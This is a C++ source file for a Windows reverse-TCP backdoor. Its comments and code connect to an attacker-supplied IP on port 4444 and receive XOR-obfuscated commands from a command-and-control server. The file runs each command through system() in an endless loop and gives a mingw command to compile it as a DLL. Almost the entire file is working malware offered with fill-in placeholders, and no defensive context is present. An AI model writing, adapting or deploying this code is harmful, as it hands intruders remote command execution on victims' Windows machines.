//this payload uses reverse TCP connection to an attacker ip address and listens for commands to execute on the target machine,
//this payload uses Winsock for establishing a tcp connection between the target machine and the attacker machine.
//in an infinite loop, the payload receives commands from the attacker c2 , decrypts them using (XOR)encryption, executes them using system, and then sleeps for 10 seconds before repeating the loop.

//manual compile: x86_64-w64-mingw32-g++ -o payload.dll payload.cpp -lws2_32 -static-libgcc -static-libstdc++

#include <iostream>
#include <string>
#include <cstring>
#include <winsock2.h>
#include <ws2tcpip.h>

// XOR encryption
std::string xorEncrypt(const std::string& data, const std::string& key) {
    std::string encrypted;
    for (size_t i = 0; i < data.size(); ++i) {
        encrypted += data[i] ^ key[i % key.size()];
    }
    return encrypted;
}

int main() {
    std::string attackerIP = "192.168.1.1"; // replace with your iP address
    int port = 4444; // replace with your port 
    std::string encryptionKey = "123456789"; // replace with XOR encryption key

    // initialize Winsock
    WSADATA wsData;
    WORD version = MAKEWORD(2, 2);
    if (WSAStartup(version, &wsData) != 0) {
        std::cerr << "Error initializing Winsock.\n";
        return 1;
    }


    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == INVALID_SOCKET) {
        std::cerr << "Socket creation failed.\n";
        WSACleanup();
        return 1;
    }


    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, attackerIP.c_str(), &serverAddr.sin_addr);


    if (connect(sockfd, (sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
        std::cerr << "Connection failed.\n";
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }


    while (true) {
        std::string commands;
        char buffer[4096];
        int bytesReceived = recv(sockfd, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            commands = buffer;
        }

        std::string decryptedCommands = xorEncrypt(commands, encryptionKey);


        system(decryptedCommands.c_str());


        Sleep(10);
    }

    closesocket(sockfd);
    WSACleanup();

    return 0;
}

